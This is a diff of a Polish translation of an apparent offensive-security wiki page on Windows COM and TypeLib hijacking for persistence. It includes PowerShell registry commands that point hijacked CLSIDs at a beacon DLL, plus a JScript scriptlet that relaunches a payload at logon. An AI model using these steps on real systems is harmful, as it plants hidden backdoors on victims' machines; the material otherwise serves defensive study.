@@ -4,13 +4,13 @@
 
 ### Wyszukiwanie nieistniejących komponentów COM
 
-Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników **COM Hijacking** może być użyte jako **mechanizm utrzymania dostępu**. Korzystając z `procmon` łatwo znaleźć przeszukiwane wpisy rejestru COM, które nie istnieją, a które atakujący mógłby utworzyć, aby utrzymać się w systemie. Filtry:
+Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników, **COM Hijacking** może być użyte jako **mechanizm utrzymania dostępu**. Za pomocą `procmon` łatwo znaleźć przeszukiwane wpisy rejestru COM, które nie istnieją, a które atakujący mógłby utworzyć, aby zachować dostęp. Filtry:
 
-- Operacje **RegOpenKey**.
+- operacje **RegOpenKey**.
 - gdzie _Result_ jest **NAME NOT FOUND**.
-- oraz _Path_ kończy się na **InprocServer32**.
+- i _Path_ kończy się na **InprocServer32**.
 
-Po wybraniu, który nieistniejący komponent COM chcesz podszyć, wykonaj następujące polecenia. _Uważaj, jeśli zdecydujesz się podszyć pod COM, który jest ładowany co kilka sekund, ponieważ może to być przesadne._
+Gdy zdecydujesz, który nieistniejący COM chcesz podszyć się pod, wykonaj następujące polecenia. _Uważaj, jeśli zdecydujesz się podszyć pod COM, który jest ładowany co kilka sekund — może to być przesadne._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -18,7 +18,7 @@ New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F
 ```
 ### Hijackable Task Scheduler COM components
 
-Windows Tasks używają Custom Triggers do wywoływania COM objects, a ponieważ są uruchamiane przez Task Scheduler, łatwiej przewidzieć, kiedy zostaną wywołane.
+Windows Tasks używają Custom Triggers do wywoływania COM objects, a ponieważ są uruchamiane przez Task Scheduler, łatwiej przewidzieć, kiedy zostaną uruchomione.
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -49,9 +49,9 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-Sprawdzając wyjście, możesz wybrać taki, który będzie uruchamiany na przykład **za każdym razem, gdy użytkownik się zaloguje**.
+Analizując wynik, możesz wybrać taki, który na przykład będzie wywoływany **przy każdym logowaniu użytkownika**.
 
-Teraz, szukając CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\CLASSES\ROOT\CLSID** oraz w HKLM i HKCU, zwykle stwierdzisz, że wartość ta nie istnieje w HKCU.
+Teraz, przeszukując CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\CLASSES\ROOT\CLSID** oraz w HKLM i HKCU, zazwyczaj okaże się, że wartość nie istnieje w HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -72,32 +72,32 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Następnie możesz po prostu utworzyć wpis HKCU i za każdym logowaniem użytkownika twój backdoor zostanie uruchomiony.
+Następnie możesz po prostu utworzyć wpis w HKCU i za każdym razem, gdy użytkownik się zaloguje, twój backdoor zostanie uruchomiony.
 
 ---
 
 ## COM TypeLib Hijacking (script: moniker persistence)
 
-Type Libraries (TypeLib) definiują interfejsy COM i są ładowane za pomocą `LoadTypeLib()`. Gdy serwer COM jest instancjonowany, OS może także załadować powiązany TypeLib, konsultując klucze rejestru pod `HKCR\TypeLib\{LIBID}`. Jeśli ścieżka TypeLib zostanie zamieniona na **moniker**, np. `script:C:\...\evil.sct`, Windows wykona scriptlet w momencie rozwiązywania TypeLib — dając ukryty mechanizm persistence, który uruchamia się, gdy wspólne komponenty są używane.
+Type Libraries (TypeLib) definiują interfejsy COM i są ładowane za pomocą `LoadTypeLib()`. Kiedy serwer COM jest instancjonowany, system może również załadować powiązany TypeLib, sprawdzając klucze rejestru pod `HKCR\TypeLib\{LIBID}`. Jeśli ścieżka TypeLib zostanie zastąpiona **monikerem**, np. `script:C:\...\evil.sct`, Windows wykona scriptlet w momencie rozwiązania TypeLib — dając ukrytą formę persistence, która uruchamia się, gdy dotknięte zostaną powszechne komponenty.
 
-Zaobserwowano to w kontekście Microsoft Web Browser control (często ładowanego przez Internet Explorer, aplikacje osadzające WebBrowser, a nawet `explorer.exe`).
+This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).
 
-### Kroki (PowerShell)
+### Steps (PowerShell)
 
-1) Zidentyfikuj TypeLib (LIBID) używany przez CLSID o dużej częstotliwości. Przykładowy CLSID często nadużywany przez malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
+1) Zidentyfikuj TypeLib (LIBID) używany przez CLSID często wywoływany. Przykładowy CLSID często nadużywany przez łańcuchy malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
 $libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
 $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
-2) Wskaż ścieżkę TypeLib dla użytkownika na lokalny scriptlet, używając monikera `script:` (nie są wymagane prawa administratora):
+2) Wskaż per-user TypeLib path na lokalny scriptlet, używając monikeru `script:` (prawa administratora nie są wymagane):
 ```powershell
 $dest = 'C:\\ProgramData\\Udate_Srv.sct'
 New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
-3) Umieść minimalny JScript `.sct`, który ponownie uruchomi twój główny payload (np. `.lnk` używany przez początkowy łańcuch):
+3) Drop minimalny JScript `.sct`, który ponownie uruchamia twój główny payload (np. `.lnk` używany przez początkowy chain):
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
@@ -114,7 +114,7 @@ sh.Run(cmd, 0, false);
 </script>
 </scriptlet>
 ```
-4) Wywoływanie – otwarcie IE, aplikacji, która osadza WebBrowser control, lub nawet rutynowa aktywność Explorer spowoduje załadowanie TypeLib i wykonanie scriptlet, ponownie uzbrajając twój chain przy logon/reboot.
+4) Wyzwalanie – otwarcie IE, aplikacji, która osadza WebBrowser control, lub nawet rutynowa aktywność Explorer spowoduje załadowanie TypeLib i wykonanie scriptlet, ponownie uzbrajając łańcuch przy logon/reboot.
 
 Czyszczenie
 ```powershell
@@ -123,9 +123,9 @@ Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$n
 # Delete the dropped scriptlet
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
-Uwagi
+Notatki
 - Możesz zastosować tę samą logikę do innych często używanych komponentów COM; zawsze najpierw ustal rzeczywisty `LIBID` z `HKCR\CLSID\{CLSID}\TypeLib`.
-- Na systemach 64-bitowych możesz również wypełnić podklucz `win64` dla konsumentów 64-bitowych.
+- Na systemach 64-bitowych możesz także wypełnić podklucz `win64` dla 64-bitowych aplikacji.
 
 ## Źródła
 
